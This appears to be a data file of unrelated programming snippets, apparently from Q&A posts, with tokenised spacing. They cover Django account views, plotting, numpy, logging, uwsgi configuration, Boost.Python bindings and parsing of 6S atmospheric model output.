= form.cleaned_data [ 'bio ' ] account.avatar = form.cleaned_data [ 'avatar ' ] account.year_of_birth = form.cleaned_data [ 'year_of_birth ' ] account.save ( ) context = { 'account ' : account } return HttpResponseRedirect ( '/accounts/profile ' ) else : x =form.errors context = { 'form ' : form , 'errors ' : form.errors } return render ( request , 'accounts/edit.html ' , context ) else : context = { 'form ' : form } return render ( request , 'accounts/edit.html ' , context ) def change_password ( request ) : user = request.user if request.method == 'POST ' : form = PasswordForm ( request.POST ) if form.is_valid ( ) : cleaned_data = form.cleaned_data if not user.check_password ( cleaned_data [ 'old_password ' ] ) : form.add_error ( 'old_password ' , 'Old password is incorrect ' ) context = { 'form ' : form } return render ( request , 'accounts/password.html ' , context ) try : user.set_password ( cleaned_data [ 'new_password ' ] ) user.save ( ) return HttpResponseRedirect ( '/accounts/profile ' ) except Exception as e : form = PasswordForm ( ) context = { 'form ' : form } return render ( request , 'accounts/password.html ' , context ) else : form = PasswordForm ( ) context = { 'form ' : form } return render ( request , 'accounts/password.html ' , context ) class PasswordForm ( forms.Form ) : old_password = forms.CharField ( max_length=200 ) new_password = forms.CharField ( max_length=200 ) confirm_password = forms.CharField ( max_length=200 ) def clean ( self , *args , **kwargs ) : cleaned_data = super ( PasswordForm , self ) .clean ( ) if 'new_password ' in cleaned_data : new_password = cleaned_data [ 'new_password ' ] else : new_password = None if 'confirm_password ' in cleaned_data : confirm_password = cleaned_data [ 'confirm_password ' ] else : confirm_password = None if confirm_password and new_password : if new_password ! = confirm_password : self.add_error ( 'confirm_password ' , 'Passwords do not match ' )"
"A = [ [ 1 , 1 , 3 ] , [ 1 , 2 ] , [ 1 , 1 , 2 , 4 ] ] ( 0 , 0 ) , ( 0 , 1 ) , ( 1 , 0 ) , ( 2 , 0 ) , ( 2 , 1 ) , ( 1 , 1 ) , ( 2 , 2 ) , ( 0 , 2 ) , ( 2 , 3 ) 1 , 1 , 1 , 1 , 1 , 2 , 2 , 3 , 4 for i in range ( m ) : A [ i ] .sort ( ) S = [ ] for x in range ( 1 , n+1 ) : for i in range ( m ) : for j in range ( len ( A [ i ] ) ) : if A [ i ] [ j ] == x : S.append ( ( i , j ) )"
"# -*- coding : utf-8 -*-import tredef apro_match ( word , list ) : fz = tre.Fuzzyness ( maxerr=3 ) pt = tre.compile ( word ) for i in l : m = pt.search ( i , fz ) if m : print m.groups ( ) [ 0 ] , ' ' , m [ 0 ] if __name__ == '__main__ ' : string1 = u'Berlín'.encode ( 'utf-8 ' ) string2 = u'Bärlin'.encode ( 'utf-8 ' ) string3 = u ' B\xe4rlin'.encode ( 'utf-8 ' ) string4 = u'Berlän'.encode ( 'utf-8 ' ) string5 = u'London , Paris , Bärlin'.encode ( 'utf-8 ' ) string6 = u'äerlin'.encode ( 'utf-8 ' ) string7 = u'Beälin'.encode ( 'utf-8 ' ) l = [ 'Moskau ' , string1 , string2 , string3 , string4 , string5 , string6 , string7 ] print '\n'*2 print `` apro_match ( 'Berlin ' , l ) '' print `` = '' *20 apro_match ( 'Berlin ' , l ) print '\n'*2 print `` apro_match ( ' . *Berlin ' , l ) '' print `` = '' *20 apro_match ( ' . *Berlin ' , l ) apro_match ( 'Berlin ' , l ) ==================== ( 0 , 7 ) Berlín ( 1 , 7 ) ärlin ( 1 , 7 ) ärlin ( 0 , 7 ) Berlän ( 16 , 22 ) ärlin ( 1 , 7 ) ? erlin ( 0 , 7 ) Beälinapro_match ( ' . *Berlin ' , l ) ==================== ( 0 , 7 ) Berlín ( 0 , 7 ) Bärlin ( 0 , 7 ) Bärlin ( 0 , 7 ) Berlän ( 0 , 22 ) London , Paris , Bärlin ( 0 , 7 ) äerlin ( 0 , 7 ) Beälin u'Bärlin'.encode ( 'utf-8 ' ) u ' B\xe4rlin'.encode ( 'utf-8 ' ) u'äerlin'.encode ( 'utf-8 ' ) u'Berlín'.encode ( 'utf-8 ' ) u'Berlän'.encode ( 'utf-8 ' ) u'London , Paris , Bärlin'.encode ( 'utf-8 ' ) u'Beälin'.encode ( 'utf-8 ' )"
"import inspectdef deco ( f ) : def g ( *args ) : print inspect.ismethod ( f ) return f ( *args ) return gclass Adder : @ deco def __call__ ( self , a ) : return a + 1class Adder2 : def __call__ ( self , a ) : return a + 2Adder2.__call__ = deco ( Adder2.__call__ ) > > > a = Adder ( ) > > > a ( 1 ) False2 > > > a2 = Adder2 ( ) > > > a2 ( 1 ) True3"
"import matplotlib.pyplot as plt ; from matplotlib.ticker import FormatStrFormatter ; x = [ 1,2,3,4,5 ] ; y = [ 0.1,0.2,0.3,0.4,0.5 ] ; fig , ax = plt.subplots ( ) ; ax.set_ylim ( [ 0.005,0.99 ] ) ; ax.set_yscale ( 'logit ' ) ; ax.yaxis.set_minor_formatter ( FormatStrFormatter ( `` '' ) ) ; ax.set_xlabel ( `` X axis '' ) ; ax.set_ylabel ( `` Y axis '' ) ; # set y axis label ( logit scale ) ax.plot ( x , y ) ; plt.show ( ) ; plt.close ( ) ; Traceback ( most recent call last ) : File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/backends/backend_macosx.py '' , line 136 , in _draw self.figure.draw ( renderer ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/artist.py '' , line 63 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/figure.py '' , line 1143 , in draw renderer , self , dsu , self.suppressComposite ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/image.py '' , line 139 , in _draw_list_compositing_images a.draw ( renderer ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/artist.py '' , line 63 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/axes/_base.py '' , line 2409 , in draw mimage._draw_list_compositing_images ( renderer , self , dsu ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/image.py '' , line 139 , in _draw_list_compositing_images a.draw ( renderer ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/artist.py '' , line 63 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/axis.py '' , line 1150 , in draw self.label.draw ( renderer ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/artist.py '' , line 63 , in draw_wrapper draw ( artist , renderer , *args , **kwargs ) File `` /Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/matplotlib/text.py '' , line 762 , in draw raise ValueError ( `` posx and posy should be finite values '' ) ValueError : posx and posy should be finite values ax.set_ylabel ( `` Y axis '' ) ; # set y axis label ( logit scale )"
"import logginglogger = logging.getLogger ( 'root ' ) FORMAT = `` [ % ( filename ) s : % ( lineno ) s - % ( funcName ) 20s ( ) ] % ( message ) s '' logging.basicConfig ( format=FORMAT ) logger.setLevel ( logging.DEBUG ) > > > logger.__class__ < class 'logging.Logger ' > > > > logger.debug ( `` hello '' ) [ < stdin > :1 - < module > ( ) ] hello > > > logger.debug ( `` hello '' , '' world '' ) Traceback ( most recent call last ) : File `` c : \Python2711\Lib\logging\__init__.py '' , line 853 , in emit msg = self.format ( record ) File `` c : \Python2711\Lib\logging\__init__.py '' , line 726 , in format return fmt.format ( record ) File `` c : \Python2711\Lib\logging\__init__.py '' , line 465 , in format record.message = record.getMessage ( ) File `` c : \Python2711\Lib\logging\__init__.py '' , line 329 , in getMessage msg = msg % self.argsTypeError : not all arguments converted during string formattingLogged from file < stdin > , line 1"
"# ! /usr/bin/env pythonimport sys , osprint os.path.basename ( sys.argv [ 0 ] ) , sys.argv [ 1 : ] $ 1.py -1 dfd 'gf g ' `` df df '' 1.py [ '-1 ' , 'dfd ' , 'gf g ' , 'df df ' ] args = parser.parse_args ( ) logName = `` . '' + ( os.path.splitext ( os.path.basename ( sys.argv [ 0 ] ) ) ) [ 0 ] + `` .json '' if os.path.exists ( logName ) : print `` ! ! ! I 've found log '' , logName Args = bk_loads_json ( logName ) for arg in Args : exec ( 'args . { 0 } = Args [ `` { 0 } '' ] '.format ( arg ) ) else : print `` ! ! ! the log of args is saved to '' , logName bk_saves_json ( args.__dict__ , logName ) def bk_saves_json ( myCustomDct , flNm ) : `` Takes dict , and writes it to the file . '' FlNm = open ( flNm , ' w ' ) tmpJsn = json.dumps ( myCustomDct , sort_keys=True , indent=4 ) FlNm.write ( tmpJsn ) FlNm.close ( ) def bk_loads_json ( flNm ) : `` Takes file of the json and returns it as a dict . '' json_data=open ( flNm ) data = json.load ( json_data ) json_data.close ( ) return data"
/var/log/uwsgi/emperor.log/var/log/uwsgi/myapp_uwsgi.log/var/log/nginx/access.log/var/log/nginx/error.log
"( ? < ! as of ) ( \d { 1,2 } -\d { 1,2 } -\d { 2 } ) bad regex for testing : ( ? < ! as of ) ( \d { 2 } -\d { 1,2 } -\d { 2 } )"
"( 1050 , `` Table ' { tablename } ' already exists '' )"
"import times = `` 2014-05-22 17:16:15 '' t1 = time.strptime ( s , `` % Y- % m- % d % H : % M : % S '' ) # Set timezone for t1 as US/Pacific # Based on t1 , calculate the time t2 in a different time zone # ( e.g , Central European Time ( CET ) )"
> > > foo1 = 4 > > > foo2 = 2+2 > > > id ( foo1 ) 37740064L > > > id ( foo2 ) 37740064L > > > foo1 = 4.3 > > > foo2 = 1.3+3.0 > > > id ( foo1 ) 37801304L > > > id ( foo2 ) 37801232L > > >
"import cv2import numpy as npimport urllibimport mpl_toolkits.mplot3d.axes3d as p3import matplotlib.pyplot as plt # Load an image that contains all possible colors.request = urllib.urlopen ( 'IMD021.png ' ) image_array = np.asarray ( bytearray ( request.read ( ) ) , dtype=np.uint8 ) image = cv2.imdecode ( image_array , cv2.CV_LOAD_IMAGE_COLOR ) lab_image = cv2.cvtColor ( image , cv2.COLOR_BGR2LAB ) l_channel , a_channel , b_channel = cv2.split ( lab_image ) fig = plt.figure ( ) ax = p3.Axes3D ( fig ) ax.scatter ( l_channel , a_channel , b_channel , marker= ' o ' , facecolors=cv2.cvtColor ( image , cv2.COLOR_BGR2RGB ) .reshape ( -1,3 ) /255 . ) ax.set_xlabel ( ' L ' ) ax.set_ylabel ( ' A ' ) ax.set_zlabel ( ' B ' ) fig.add_axes ( ax ) # plt.savefig ( 'plot-15.png ' ) plt.show ( )"
"import numpy as npdef x2 ( x ) : return x*xdef nx ( x ) : return 2*xa = np.linspace ( -3 , 3 , 16 ) a1 = x2 ( a ) a2 = nx ( a ) b1 = np.fft.fft ( a1 ) b2 = np.fft.fft ( a2 ) c = b1/b2 array ( [ 1.02081592e+16+0.j , 1.32769987e-16-1.0054679j , 4.90653893e-17-0.48284271j , -1.28214041e-16-0.29932115j , -1.21430643e-16-0.2j , 5.63664751e-16-0.13363573j , -5.92271642e-17-0.08284271j , -4.21346622e-16-0.03978247j , -5.55111512e-16-0.j , -5.04781597e-16+0.03978247j , -6.29288619e-17+0.08284271j , 8.39500693e-16+0.13363573j , -1.21430643e-16+0.2j , -0.00000000e+00+0.29932115j , -0.00000000e+00+0.48284271j , 1.32769987e-16+1.0054679j ] )"
"PV = RT class gasProperties ( object ) : __init__ ( self , P=None , V=None , R=None , T=None ) self.setFlowParams ( P , V , R , T ) def setFlowParams ( self , P=None , V=None , R=None , T=None ) if P is None : self._P = R*T/V self._V = V self._R = R self._T = T elif V is None : self._V = R*T/P self._P = P self._R = R self._T = T # etc"
"class Point : def __init__ ( self , coord=None ) : self.x = coord [ 0 ] self.y = coord [ 1 ] @ property def coordinate ( self ) : return ( self.x , self.y ) @ coordinate.setter def coordinate ( self , value ) : self.x = value [ 0 ] self.y = value [ 1 ] p = Point ( ( 0,0 ) ) p.coordinate = ( 1,2 ) > > > p.x0 > > > p.y0 > > > p.coordinate ( 1 , 2 )"
[ uwsgi ] strict = truewsgi-file = foo.pycallable = appdie-on-term = truehttp-socket = :2345master = trueenable-threads = truethunder-lock = trueprocesses = 6threads = 1memory-report = true cheaper = 6cheaper-initial = 6processes = 6
"@ application.errorhandler ( Exception ) def http_error_handler ( error ) : return flask.render_template ( 'error.html ' , error=error ) , 500"
"class BaseApiTest ( ResourceTestCaseMixin , django.test.TestCase ) : def setUp ( self ) : super ( ) .setUp ( ) self.username = `` secret_user '' self.password = `` sekret '' self.email = `` secret @ mail.com '' self.first_name = `` FirstName '' self.last_name = `` LastName '' self.user = User.objects.create_superuser ( self.username , self.username , self.password ) class TheAPITest ( BaseApiTest ) : def setUp ( self ) : super ( ) .setUp ( ) # more setup goes here"
( sed -n ' $ vars ' < input.txt ) > output.txt
"class PrivateGraphQLView ( GraphQLView ) : data = self.parse_body ( request ) operation_name = data.get ( 'operationName ' ) # hard-coding === not pretty . if operation_name in [ 'loginUser ' , 'createUser ' ] : ... response.set_cookie ( ... ) return response"
"new_file = new_file + line + string new_file += line + string for line in content : import timeimport cmdbrefname = `` STAGE050.csv '' regions = cmdbre.regionsstart_time = time.time ( ) with open ( fname ) as f : content = f.readlines ( ) new_file_content = `` '' new_file = open ( `` CMDB_STAGE060.csv '' , `` w '' ) row_region = `` '' i = 0 for line in content : if ( i==0 ) : new_file_content = line.strip ( ) + `` ~region '' + `` \n '' else : country = line.split ( `` ~ '' ) [ 13 ] try : row_region = regions [ country ] except KeyError : row_region = `` Undetermined '' new_file_content += line.strip ( ) + `` ~ '' + row_region + `` \n '' print ( row_region ) i = i + 1 new_file.write ( new_file_content ) new_file.close ( ) end_time = time.time ( ) print ( `` total time : `` + str ( end_time - start_time ) )"
import stringprint string.letters
"from matplotlib import pyplotfrom scipy import mathfrom mpl_toolkits.mplot3d import Axes3Dfig = pyplot.figure ( ) ax = fig.add_subplot ( 111 , projection='3d ' ) ax.scatter ( xPosition , yPosition , zPosition , c = velocity , s = mass ) ax.set_xlim3d ( -plotSize , plotSize ) ax.set_ylim3d ( -plotSize , plotSize ) ax.set_zlim3d ( -plotSize , plotSize ) pyplot.savefig ( 'plot.png ' )"
"import subprocessproc = subprocess.Popen ( 'TABARI -a ' + file , shell=True , stdout=subprocess.PIPE , stderr=subprocess.PIPE ) print proc.communicate ( ) ( `` , 'Error opening terminal : unknown.\n ' ) ( ' ... lots of text ... ' , `` )"
"with open ( `` temp.db '' , `` rb '' ) as openf : byte_stream = io.BytesIO ( openf.read ( ) ) sqlite3.connect ( byte_stream ) with open ( `` temp.db '' , `` wb '' ) as openf : openf.write ( byte_stream ) sqlite3.connect ( `` temp.db '' )"
"import pandas as pddata_csv = pd.read_csv ( 'https : //biz.yahoo.com/p/csv/422conameu.csv ' ) data_csv data_csv [ 'Market Cap ' ] [ 0 ] type ( data_csv [ 'Market Cap ' ] [ 0 ] ) data_csv.loc [ data_csv [ 'Market Cap ' ] .str.contains ( ' B ' ) , 'Market Cap ' ] = data_csv [ 'Market Cap ' ] .str.replace ( ' B ' , `` ) .astype ( float ) .fillna ( 0.0 ) data_csv ValueError : invalid literal for float ( ) : 6.46M"
"matrix1 = [ [ 11,12,13,14,15,16,17 ] , [ 21,22,23,24,25,26,27 ] , [ 31,32,33,34,35,36,37 ] , [ 41,42,43,44,45,46,47 ] , [ 51,52,53,54,55,56,57 ] , [ 61,62,63,64,65,66,67 ] , [ 71,72,73,74,75,76,77 ] ] def pointwise_product ( a_matrix , a_second_matrix ) : # return m [ i ] [ j ] = a_matrix [ i ] [ j ] x a_second_matrix [ i ] [ j ] return [ i*j for i , j in zip ( a_matrix , a_second_matrix ) ]"
> > > class R ( object ) : pass ... > > > _R = R ( ) > > > import inspect > > > inspect.isclass ( _R ) False > > > inspect.isclass ( R ) True > > > import types > > > class R ( ) : pass # old-style class ... > > > _R = R ( ) > > > import types > > > type ( _R ) is types.InstanceTypeTrue > > > class R ( object ) : pass # new-style class ... > > > _R = R ( ) > > > type ( _R ) is types.InstanceTypeFalse
"def after_6_hours ( ) : print ( ' 6 hours passed . ' ) def create_game ( ) : print ( 'Game created ' ) # of course time will be error , but that 's just an example scheduler.do ( after_6_hours , time=now + 6 )"
"import java.awt.EventQueue ; import javax.swing.JFrame ; import javax.swing.UIManager ; import javax.swing.UnsupportedLookAndFeelException ; import javax.swing.JButton ; import java.awt.GridBagLayout ; import java.awt.GridBagConstraints ; import java.awt.event.ActionListener ; import java.awt.event.ActionEvent ; import com.ezware.dialog.task.TaskDialogs ; public class SwingExceptionTest { private JFrame frame ; public static void main ( String [ ] args ) { try { UIManager.setLookAndFeel ( UIManager.getSystemLookAndFeelClassName ( ) ) ; } catch ( ClassNotFoundException e ) { } catch ( InstantiationException e ) { } catch ( IllegalAccessException e ) { } catch ( UnsupportedLookAndFeelException e ) { } Thread.setDefaultUncaughtExceptionHandler ( new Thread.UncaughtExceptionHandler ( ) { public void uncaughtException ( Thread t , Throwable e ) { TaskDialogs.showException ( e ) ; } } ) ; EventQueue.invokeLater ( new Runnable ( ) { public void run ( ) { try { SwingExceptionTest window = new SwingExceptionTest ( ) ; window.frame.setVisible ( true ) ; } catch ( Exception e ) { e.printStackTrace ( ) ; } } } ) ; } public SwingExceptionTest ( ) { initialize ( ) ; } private void initialize ( ) { frame = new JFrame ( ) ; frame.setBounds ( 100 , 100 , 600 , 400 ) ; frame.setDefaultCloseOperation ( JFrame.EXIT_ON_CLOSE ) ; GridBagLayout gridBagLayout = new GridBagLayout ( ) ; gridBagLayout.columnWidths = new int [ ] { 0 , 0 } ; gridBagLayout.rowHeights = new int [ ] { 0 , 0 } ; gridBagLayout.columnWeights = new double [ ] { 0.0 , Double.MIN_VALUE } ; gridBagLayout.rowWeights = new double [ ] { 0.0 , Double.MIN_VALUE } ; frame.getContentPane ( ) .setLayout ( gridBagLayout ) ; JButton btnNewButton = new JButton ( `` Throw ! `` ) ; btnNewButton.addActionListener ( new ActionListener ( ) { public void actionPerformed ( ActionEvent arg0 ) { onButton ( ) ; } } ) ; GridBagConstraints gbc_btnNewButton = new GridBagConstraints ( ) ; gbc_btnNewButton.gridx = 0 ; gbc_btnNewButton.gridy = 0 ; frame.getContentPane ( ) .add ( btnNewButton , gbc_btnNewButton ) ; } protected void onButton ( ) { Thread worker = new Thread ( ) { public void run ( ) { throw new RuntimeException ( `` Exception ! `` ) ; } } ; worker.start ( ) ; } } import StringIOimport sysimport tracebackimport wxfrom wx.lib.delayedresult import startWorkerdef thread_guard ( f ) : def thread_guard_wrapper ( *args , **kwargs ) : try : r = f ( *args , **kwargs ) return r except Exception : exc = sys.exc_info ( ) output = StringIO.StringIO ( ) traceback.print_exception ( exc [ 0 ] , exc [ 1 ] , exc [ 2 ] , file=output ) raise Exception ( `` < THREAD GUARD > \n\n '' + output.getvalue ( ) ) return thread_guard_wrapper @ thread_guarddef thread_func ( ) : return 1 / 0def thread_done ( result ) : r = result.get ( ) print rclass MainWindow ( wx.Frame ) : def __init__ ( self , *args , **kwargs ) : wx.Frame.__init__ ( self , *args , **kwargs ) self.panel = wx.Panel ( self ) self.button = wx.Button ( self.panel , label= '' Throw ! '' ) self.button.Bind ( wx.EVT_BUTTON , self.OnButton ) self.sizer = wx.BoxSizer ( ) self.sizer.Add ( self.button ) self.panel.SetSizerAndFit ( self.sizer ) self.Show ( ) def OnButton ( self , e ) : startWorker ( thread_done , thread_func ) app = wx.App ( True ) win = MainWindow ( None , size= ( 600 , 400 ) ) app.MainLoop ( )"
"from projectname.algorithms.module1 import method1 , method2 from projectname.algorithms import Group1 ... Group1.method1 ( parameter1 ) ... Group1.method2 ( parameter1 )"
"a = np.ones ( ( 10 , 10 , 20 ) ) b = np.tile ( np.arange ( 10 ) + 10 , ( 10 , 1 ) ) c = a [ b ]"
"fs = 1e4 ; dt = 1 / fs ; t = 0 : dt:0.5 ; F = 1e3 ; y = cos ( 2*pi*F*t ) ; S = fftshift ( fft ( y ) / length ( y ) ) ; f_scale = linspace ( -1 , 1 , length ( y ) ) * ( fs / 2 ) ; a = abs ( S ) ; phi = ( angle ( S ) ) ; subplot ( 2 , 1 , 1 ) plot ( f_scale , a ) title ( 'amplitude ' ) subplot ( 2 , 1 , 2 ) plot ( f_scale , phi ) title ( 'phase ' ) import numpy as npimport matplotlib.pyplot as pltfs = 1e4dt = 1 / fst = np.arange ( 0 , 0.5 , dt ) F = 1e3y = np.cos ( 2*np.pi*F*t ) S = np.fft.fftshift ( np.fft.fft ( y ) / y.shape [ 0 ] ) f_scale = np.linspace ( -1 , 1 , y.shape [ 0 ] ) * ( fs / 2 ) a = np.abs ( S ) phi = np.angle ( S ) plt.subplot ( 2 , 1 , 1 , title= '' amplitude '' ) plt.plot ( f_scale , a ) plt.subplot ( 2 , 1 , 2 , title= '' phase '' ) plt.plot ( f_scale , phi ) plt.show ( )"
"class Dummy ( object ) : def __init__ ( self , v ) : self.ticker = vdef main ( ) : def _assign_custom_str ( x ) : def _show_ticker ( t ) : return t.ticker x.__str__ = _show_ticker x.__repr__ = _show_ticker return x a = [ Dummy ( 1 ) , Dummy ( 2 ) ] a1 = [ _assign_custom_str ( t ) for t in a ] print a1 [ 1 ] # print a1 [ 1 ] .__str__ # test to if orig __str__ is replaced 2 < __main__.Dummy object at 0x01237730 >"
d = defaultdict ( deque ) d = defaultdict ( deque ( maxlen=10 ) )
"# include < string > # include < iostream > # include < boost/python.hpp > # include < boost/enable_shared_from_this.hpp > using namespace boost : :python ; using namespace boost ; //~ Base Class ClassAclass ClassA : public enable_shared_from_this < ClassA > { protected : ClassA ( ) { } public : static shared_ptr < ClassA > create ( ) { return shared_ptr < ClassA > ( new ClassA ( ) ) ; } virtual void quack ( ) { std : :cout < < `` quacks like a ClassA Base '' < < std : :endl ; } } ; //~ Wrapper for ClassAstruct WrapClassA : public ClassA , wrapper < WrapClassA > { static shared_ptr < WrapClassA > create ( ) { return shared_ptr < WrapClassA > ( new WrapClassA ( ) ) ; } void quack ( ) { std : :cout < < `` quacking like a Wrapper ... '' < < std : :endl ; if ( override f = this- > get_override ( `` quack '' ) ) { std : :cout < < `` ... override found ! `` < < std : :endl ; f ( ) ; } else { std : :cout < < `` ... no override found ! `` < < std : :endl ; ClassA : :quack ( ) ; } } void default_quack ( ) { this- > ClassA : :quack ( ) ; } } ; //~ C++ Call Testvoid quack ( shared_ptr < ClassA > ptr ) { ptr- > quack ( ) ; } //~ ExposingBOOST_PYTHON_MODULE ( TestCase ) { def ( `` quack '' , & quack ) ; class_ < ClassA , shared_ptr < WrapClassA > , noncopyable > ( `` ClassA '' , no_init ) .def ( `` __init__ '' , make_constructor ( & WrapClassA : :create ) ) .def ( `` quack '' , & ClassA : :quack , & WrapClassA : :default_quack ) ; } //~ Mainint main ( ) { PyImport_AppendInittab ( `` TestCase '' , & initTestCase ) ; Py_Initialize ( ) ; boost : :python : :object main_module ( ( boost : :python : :handle < > ( boost : :python : :borrowed ( PyImport_AddModule ( `` __main__ '' ) ) ) ) ) ; boost : :python : :object main_namespace = main_module.attr ( `` __dict__ '' ) ; boost : :python : :object testcase_module ( ( boost : :python : :handle < > ( PyImport_ImportModule ( `` TestCase '' ) ) ) ) ; main_namespace [ `` TestCase '' ] = testcase_module ; FILE* test_file = fopen ( `` test.py '' , `` r '' ) ; PyRun_SimpleFile ( test_file , `` test.py '' ) ; fclose ( test_file ) ; std : :cin.get ( ) ; return 0 ; } print `` Testing.. '' class Derived ( TestCase.ClassA ) : def __init__ ( self ) : TestCase.ClassA.__init__ ( self ) def quack ( self ) : print ( `` Quacks like a derived class ! '' ) Ainst = TestCase.ClassA ( ) TestCase.quack ( Ainst ) # Should print 'Quacks like ClassA Base'Dinst = Derived ( ) TestCase.quack ( Dinst ) # Should print 'Quacks like a derived class ! ' , but does n't ! def pythonquack ( Inst ) : print Inst Inst.quack ( )"
"a b0 1 21 2 3 In [ 4 ] : df.apply ( lambda x : [ x.values ] ) Out [ 4 ] : a [ [ 140279910807944 , 140279910807920 ] ] b [ [ 140279910807944 , 140279910807920 ] ] dtype : objectIn [ 5 ] : df.apply ( lambda x : [ x.values ] ) Out [ 5 ] : a [ [ 37 , 37 ] ] b [ [ 37 , 37 ] ] dtype : objectIn [ 6 ] : df.apply ( lambda x : [ x.values ] ) Out [ 6 ] : a [ [ 11 , 11 ] ] b [ [ 11 , 11 ] ] dtype : object"
"self.redirect ( users.create_login_url ( continue_url , None , openid_url ) ) - url : /_ah/login_required script : do_openid_login.py- url : /users/ ( . * ) script : routers/user_router.py login : required"
hello=====A paragraph of text . < h1 > hello < /h1 > < p class= '' specialClass '' > A paragraph of text. < /p >
"values = lines [ 97 ] .split ( ) self.irradiance_direct , self.irradiance_diffuse , self.irradiance_env = values ******************************* 6sV version 1.0B ******************************* ** geometrical conditions identity ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - ** user defined conditions ** ** month : 14 day : 1 ** solar zenith angle : 10.00 deg solar azimuthal angle : 20.00 deg ** view zenith angle : 30.00 deg view azimuthal angle : 40.00 deg ** scattering angle : 159.14 deg azimuthal angle difference : 20.00 deg ** ** atmospheric model description ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- - ** atmospheric model identity : ** midlatitude summer ( uh2o=2.93g/cm2 , uo3=.319cm-atm ) ** aerosols type identity : ** Maritime aerosol model ** optical condition identity : ** visibility : 8.49 km opt . thick . 550 nm : 0.5000 ** ** spectral condition ** -- -- -- -- -- -- -- -- -- ** monochromatic calculation at wl 0.400 micron ** ** Surface polarization parameters ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- ** ** ** Surface Polarization Q , U , Rop , Chi 0.00000 0.00000 0.00000 0.00 ** ** ** target type ** -- -- -- -- -- - ** homogeneous ground ** monochromatic reflectance 1.000 ** ** target elevation description ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- ** ground pressure [ mb ] 1013.00 ** ground altitude [ km ] 0.000 ** ** plane simulation description ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- ** plane pressure [ mb ] 1013.00 ** plane altitude absolute [ km ] 0.000 ** atmosphere under plane description : ** ozone content 0.000 ** h2o content 0.000 ** aerosol opt . thick . 550nm 0.000 ** ** atmospheric correction activated ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- ** BRDF coupling correction ** input apparent reflectance : 0.500 ** **************************************************************************************************************************************************************** ** integrated values of : ** -- -- -- -- -- -- -- -- -- -- ** ** apparent reflectance 1.1287696 appar . rad . ( w/m2/sr/mic ) 588.646 ** total gaseous transmittance 1.000 ** ********************************************************************************* ** coupling aerosol -wv : ** -- -- -- -- -- -- -- -- -- -- ** wv above aerosol : 1.129 wv mixed with aerosol : 1.129 ** wv under aerosol : 1.129 ********************************************************************************* ** integrated values of : ** -- -- -- -- -- -- -- -- -- -- ** ** app . polarized refl . 0.0000 app . pol . rad . ( w/m2/sr/mic ) 0.000 ** direction of the plane of polarization 0.00 ** total polarization ratio 0.000 ** ********************************************************************************* ** int . normalized values of : ** -- -- -- -- -- -- -- -- -- -- -- -- -- - ** % of irradiance at ground level ** % of direct irr . % of diffuse irr . % of enviro . irr ** 0.351 0.354 0.295 ** reflectance at satellite level ** atm . intrin . ref . background ref . pixel reflectance ** 0.000 0.000 1.129 ** ** int . absolute values of ** -- -- -- -- -- -- -- -- -- -- -- - ** irr . at ground level ( w/m2/mic ) ** direct solar irr . atm . diffuse irr . environment irr ** 648.957 655.412 544.918 ** rad at satel . level ( w/m2/sr/mic ) ** atm . intrin . rad . background rad . pixel radiance ** 0.000 0.000 588.646 ** ** ** sol . spect ( in w/m2/mic ) ** 1663.594 ** **************************************************************************************************************************************************************** ** integrated values of : ** -- -- -- -- -- -- -- -- -- -- ** ** downward upward total ** global gas . trans . : 1.00000 1.00000 1.00000 ** water `` `` : 1.00000 1.00000 1.00000 ** ozone `` `` : 1.00000 1.00000 1.00000 ** co2 `` `` : 1.00000 1.00000 1.00000 ** oxyg `` `` : 1.00000 1.00000 1.00000 ** no2 `` `` : 1.00000 1.00000 1.00000 ** ch4 `` `` : 1.00000 1.00000 1.00000 ** co `` `` : 1.00000 1.00000 1.00000 ** ** ** rayl . sca . trans . : 0.84422 1.00000 0.84422 ** aeros . sca. `` : 0.94572 1.00000 0.94572 ** total sca. `` : 0.79616 1.00000 0.79616 ** ** ** ** rayleigh aerosols total ** ** spherical albedo : 0.23410 0.12354 0.29466 ** optical depth total : 0.36193 0.55006 0.91199 ** optical depth plane : 0.00000 0.00000 0.00000 ** reflectance I : 0.00000 0.00000 0.00000 ** reflectance Q : 0.00000 0.00000 0.00000 ** reflectance U : 0.00000 0.00000 0.00000 ** polarized reflect . : 0.00000 0.00000 0.00000 ** degree of polar . : nan 0.00 nan ** dir . plane polar . : -45.00 -45.00 -45.00 ** phase function I : 1.38819 0.27621 0.71751 ** phase function Q : -0.09117 -0.00856 -0.04134 ** phase function U : -1.34383 0.02142 -0.52039 ** primary deg . of pol : -0.06567 -0.03099 -0.05762 ** sing . scat . albedo : 1.00000 0.98774 0.99261 ** ** *********************************************************************************************************************************************************************************************************************************************** atmospheric correction result ** -- -- -- -- -- -- -- -- -- -- -- -- -- -- - ** input apparent reflectance : 0.500 ** measured radiance [ w/m2/sr/mic ] : 260.747 ** atmospherically corrected reflectance ** Lambertian case : 0.52995 ** BRDF case : 0.52995 ** coefficients xa xb xc : 0.00241 0.00000 0.29466 ** y=xa* ( measured radiance ) -xb ; acr=y/ ( 1.+xc*y ) *"
